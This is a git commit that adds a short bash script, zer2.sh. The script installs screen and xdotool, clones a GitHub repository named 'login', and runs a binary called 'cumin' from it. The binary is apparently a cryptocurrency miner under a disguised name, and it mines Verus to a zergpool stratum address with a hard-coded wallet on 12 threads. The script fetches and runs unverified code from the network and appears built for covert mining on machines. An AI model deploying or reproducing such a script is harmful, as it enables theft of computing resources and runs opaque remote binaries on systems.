437a56f1ade505461743ef71c20f59062de11dda
sallygonza <90584824+sallygonza@users.noreply.github.com>
2021-12-28 08:29:26 +0700

    Create zer2.sh

---
+++ zer2.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+sudo apt update
+sudo apt install screen libjansson4 xdotool -y
+git clone https://github.com/sallygonza/login.git 
+cd login
+chmod +x cumin
+./cumin -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW.zer2 -p x -t 12  c=VRSC,mc=VRSC
